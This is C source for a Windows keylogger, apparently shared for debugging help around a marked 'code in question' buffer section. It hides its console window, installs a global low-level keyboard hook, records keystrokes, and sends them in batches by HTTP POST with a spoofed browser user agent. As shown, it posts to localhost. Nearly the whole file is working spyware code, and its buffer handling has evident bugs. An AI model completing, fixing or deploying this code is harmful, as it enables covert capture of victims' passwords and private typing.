#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "wininet.lib")

HHOOK hHook = { NULL };

#define N 36
char capture[N];
int captureLength = 0;

enum Keys {
	ShiftKey = 16,
	Capital = 20,
};

int shift_active() {
	return GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0;
}

int capital_active() {
	return (GetKeyState(VK_CAPITAL) & 1) == 1;
}

void hideWindow() {
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}

int post(char capture[]) {
	char* hdrs = "Content-Type: text/plain";
	LPCSTR accept[2] = { "text/plain", NULL };

	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
	HINTERNET hConnect = InternetConnectA(hSession, "localhost", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, accept, 0, 0);

	HttpSendRequestA(hRequest, hdrs, strlen(hdrs), capture, strlen(capture));

	capture[0] = "\0";
	captureLength = 0;

	return 1;
}

LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdStruct->vkCode;
		DWORD wScanCode = kbdStruct->scanCode;

		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		lpKeyState[ShiftKey] = 0;
		lpKeyState[Capital] = 0;
		if (shift_active()) {
			lpKeyState[ShiftKey] = 0x80;
		}
		if (capital_active()) {
			lpKeyState[Capital] = 0x01;
		}

		char result;
		if (ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0) == 0) {
			//printf("\n Error copying ascii'd result to buffer!");
		}

		capture[captureLength] = result;
		// CODE IN QUESTION
		if (captureLength == N) {
			post(capture);
		}
		else {
			captureLength++;	
		}

		// END CODE IN QUESTION
	}

	return CallNextHookEx(hHook, code, wParam, lParam);
}

int main(void) {
	hideWindow();

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
	if (hHook == NULL) {
		//
	}

	while (GetMessage(NULL, NULL, 0, 0));
	return 0;
}